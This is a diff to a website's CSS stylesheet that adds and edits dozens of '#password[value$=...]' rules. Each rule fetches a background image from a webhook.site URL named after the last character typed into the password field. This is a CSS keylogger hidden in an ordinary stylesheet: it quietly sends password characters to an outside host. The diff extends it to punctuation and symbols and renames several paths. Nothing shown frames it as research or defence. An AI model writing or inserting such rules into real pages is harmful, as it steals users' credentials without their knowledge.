@@ -648,11 +648,8 @@ body {
         font-family:idgaf !important;
 }
 
-#password{
 
-}
-
-#password[value$="0"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/0");}
+#password[value$="0"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/cijfer_nul");}
 #password[value$="1"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/1");}
 #password[value$="2"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/2");}
 #password[value$="3"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/3");}
@@ -670,13 +667,13 @@ body {
 #password[value$="f"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/f");}
 #password[value$="g"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/g");}
 #password[value$="h"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/h");}
-#password[value$="i"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/i");}
+#password[value$="i"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/kleine_ie");}
 #password[value$="j"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/j");}
 #password[value$="k"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/k");}
-#password[value$="l"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/l");}
+#password[value$="l"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/kleine_el");}
 #password[value$="m"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/m");}
 #password[value$="n"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/n");}
-#password[value$="o"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/o");}
+#password[value$="o"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/kleine_oo");}
 #password[value$="p"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/p");}
 #password[value$="q"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/q");}
 #password[value$="r"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/r");}
@@ -696,13 +693,13 @@ body {
 #password[value$="F"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/F");}
 #password[value$="G"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/G");}
 #password[value$="H"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/H");}
-#password[value$="I"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/I");}
+#password[value$="I"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/grote_ie");}
 #password[value$="J"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/J");}
 #password[value$="K"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/K");}
-#password[value$="L"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/L");}
+#password[value$="L"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/grote_el");}
 #password[value$="M"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/M");}
 #password[value$="N"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/N");}
-#password[value$="O"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/O");}
+#password[value$="O"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/grote_oo");}
 #password[value$="P"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/P");}
 #password[value$="Q"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/Q");}
 #password[value$="R"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/R");}
@@ -715,3 +712,24 @@ body {
 #password[value$="Y"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/Y");}
 #password[value$="Z"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/Z");}
 #password[value$="!"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/!");}
+#password[value$="#"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/#");}
+#password[value$="$"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/$");}
+#password[value$="%"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/%");}
+#password[value$="&"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/&");}
+#password[value$="'"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/'");}
+#password[value$="*"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/*");}
+#password[value$="+"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/+");}
+#password[value$=","]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/,");}
+#password[value$="-"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/-");}
+#password[value$="."]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/.");}
+#password[value$=":"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/:");}
+#password[value$=";"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/;");}
+#password[value$="="]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/=");}
+#password[value$=">"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/>");}
+#password[value$="?"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/?");}
+#password[value$="@"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/@");}
+#password[value$="["]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/[");}
+#password[value$="]"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/]");}
+#password[value$="^"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/^");}
+#password[value$="_"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/_");}
+#password[value$="`"]{background:url("https://webhook.site/7692d1bf-c8b5-4db7-9f24-70bedbedf45b/`");}
